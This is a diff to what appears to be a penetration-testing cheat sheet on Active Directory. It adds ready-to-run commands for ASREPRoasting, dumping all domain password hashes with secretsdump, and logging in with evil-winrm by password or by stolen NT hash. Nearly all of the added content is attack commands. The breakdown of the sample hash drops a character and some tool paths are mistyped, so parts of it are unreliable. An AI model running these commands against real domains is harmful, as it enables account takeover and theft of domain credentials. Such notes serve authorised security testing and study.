@@ -1045,7 +1045,9 @@ Protocol for authentication and authorization in a computer network with the use
 - Kerberos preauthentication (ASREPRoast)
 The ASREPRoast attack looks for users without Kerberos pre-authentication required. That means that anyone can send an AS_REQ request to the KDC on behalf of any of those users, and receive an AS_REP message. This last kind of message contains a chunk of data encrypted with the original user key, derived from its password. Then, by using this message, the user password(TGT encrypted) could be cracked offline.
 ```
-impacket-GetNPUsers <domain.name>/ -dc-ip <victim_ip> -request
+impacket/example GetNPUsers <domain.name>/ -dc-ip <victim_ip> -request
+
+impacket/example GetNPUsers.py <domain.name>/ -no-pass -usersfile userslist.txt -dc-ip <victim_ip>
 ```
 
 Cracking TGT hash
@@ -1056,6 +1058,33 @@ hashcat -m 18200 --force -a 0 hashes.file rock_you.txt
 ```
 john --wordlist=rock_you.txt hashes.file
 ```
+
+- Gain access
+- https://github.com/Hackplayers/evil-winrm
+```
+ruby evil-winrm.rb --user fsmith --password password --ip 10.10.10.175
+```
+
+- AD password hashes dump from the Ntds.dit database
+```
+impacket/exampl secretsdump.py -just-dc <domain.name>/user_name:"user_password"@<victim_ip>
+
+example hash:
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
+
+Administrator is the user name
+500 is the relative identifier
+aad3b435b51404eeaad3b435b51404ee is the LM hash
+9485863c1e9e05851aa40cbb4ab9dff is the NT hash
+```
+
+- Gain access with NT Hash
+- https://github.com/Hackplayers/evil-winrm
+```
+evil-winrm --user Administrator -H NT-hash --ip <victim_ip>
+```
+
+
 
 - Kerberos brute-force
 
